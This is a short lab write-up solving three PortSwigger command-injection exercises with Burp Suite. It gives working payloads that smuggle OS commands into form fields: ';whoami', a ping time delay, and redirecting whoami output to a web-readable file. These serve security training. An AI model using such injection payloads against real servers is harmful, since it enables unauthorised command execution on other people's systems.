# Lab

## Tool: Burp Suite

## Executing arbitrary commands

### Lab: OS command injection, simple case

#### source: <https://portswigger.net/web-security/os-command-injection/lab-simple>

* To solve the lab, execute the whoami command to determine the name of the current user.

Solution:

First, we need to check the stock of any goods. After, we have the payload as `productId=1&storeId=;whoami`.

## Blind OS command injection vulnerabilities

### Detecting blind OS command injection using time delays

#### Lab: Blind OS command injection with time delays

##### source: <https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays>

* To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

Solution:

We have payload as `csrf=c8no2wEC7WKZeQZHBzdV50nys6IYckrY&name=abc&email=abc%40gmail.com&subject=abc&message=abc";+ping+-c+11+127.0.0.1;"`. I tried to inject the command into an email, but it wasn't successful. I think that message is enclosed in quotation marks, so we only need to close the message, inject the command after a quotation mark is added in, and finally void the restant quotation marks of the application by adding a new quotation mark.

### Exploiting blind OS command injection by redirecting output

#### Lab: Blind OS command injection with output redirection

##### source: <https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection>

* To solve the lab, execute the whoami command and retrieve the output.

Solution:

After consulting the solution in the above lab, I realized that I had not yet used the right method in an email. So, here is a new payload using an injected command in an email: `csrf=AySqM6Cq7BM1nUINM32UGMULTmIfGGek&name=abc&email=a||whoami+>+/var/www/images/test.txt||&subject=abc&message=abc`. After, only need to read file *test.txt* by payload as `/image?filename=test.txt`.

